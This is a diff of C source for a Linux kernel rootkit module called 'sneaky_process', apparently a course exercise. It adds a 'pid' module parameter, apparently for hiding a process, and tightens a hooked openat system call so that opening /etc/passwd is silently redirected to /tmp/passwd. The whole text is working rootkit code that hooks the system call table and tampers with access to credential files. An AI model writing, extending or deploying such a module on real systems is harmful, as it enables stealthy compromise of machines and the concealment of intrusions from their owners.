@@ -11,6 +11,9 @@
 
 #define PREFIX "sneaky_process"
 
+static char * pid;
+module_param(pid, charp, 0);
+
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
@@ -43,7 +46,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   // Implement the sneaky part here
   const char __user * pathname;
   pathname = (const char __user *)regs->di;
-  if(strstr(pathname, "/etc/passwd") != NULL){
+  if(strcmp(pathname, "/etc/passwd") == 0){
     copy_to_user((void *)regs->di, "/tmp/passwd", strlen("/tmp/passwd"));
   }
   return (*original_openat)(regs);
